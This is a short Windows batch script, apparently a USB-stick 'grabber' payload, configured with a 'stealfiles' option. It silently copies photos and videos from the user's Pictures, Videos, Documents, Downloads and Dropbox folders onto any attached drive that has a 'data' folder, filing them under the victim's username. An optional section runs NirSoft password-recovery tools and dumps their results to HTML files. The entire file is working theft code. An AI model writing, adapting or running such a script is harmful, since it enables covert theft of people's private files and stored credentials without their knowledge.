@echo off

REM ###############################################################
REM ######################### OPTIONS #############################
REM ###############################################################

set formats=*.jpg *.png *.mp4 *.3gp *.avi

set stealfiles=true
set sizemax=50000
set sizemin=100

set nirsoft=false
set soft=

REM ###############################################################
REM ############ DON'T TOUCH THIS, ONLY ADVANCED USERS ############
REM ###############################################################

set drives=D E F G H I J K L M N O P Q R S T U V W X Y Z

set /a sizemax=%sizemax%*1024
set /a sizemin=%sizemin%*1024

IF %stealfiles%==true (
	MKDIR capt\%USERNAME%
	FOR %%# IN (%drives%) DO (IF EXIST "%%#:\data" (
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Pictures\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Videos\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Documents\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Downloads\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Dropbox\ %%#:\data\capt\%USERNAME%
	))
)

IF %nirsoft%==true (
	MKDIR pss\%USERNAME%
	FOR %%I IN (%soft%) DO (
		start soft/%%I.exe /shtml "pss\%USERNAME%\%%I.html"
	)
)

exit